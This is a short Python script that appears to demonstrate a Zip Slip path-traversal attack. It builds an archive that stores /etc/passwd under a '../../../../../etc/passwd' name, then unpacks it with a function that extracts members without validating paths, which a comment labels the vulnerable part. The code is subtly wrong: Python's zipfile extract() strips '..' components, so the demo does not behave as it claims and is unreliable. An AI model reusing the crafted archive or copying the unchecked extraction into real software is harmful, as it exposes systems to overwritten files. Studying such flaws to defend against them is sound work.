import zipfile
import os

def create_malicious_zip():
    with zipfile.ZipFile('malicious.zip', 'w') as zip_ref:
        # Crafted relative path to perform Zip Slip
        malicious_path = '../../../../../etc/passwd'
        zip_ref.write('/etc/passwd', arcname=malicious_path)

def extract_zip(zip_filename, extract_path):
    with zipfile.ZipFile(zip_filename, 'r') as zip_ref:
        for member in zip_ref.namelist():
            # This is the vulnerable part, without proper path validation
            zip_ref.extract(member, extract_path)

# Usage (vulnerable code)
create_malicious_zip()
extract_path = '/tmp/unpack/'
extract_zip('malicious.zip', extract_path)
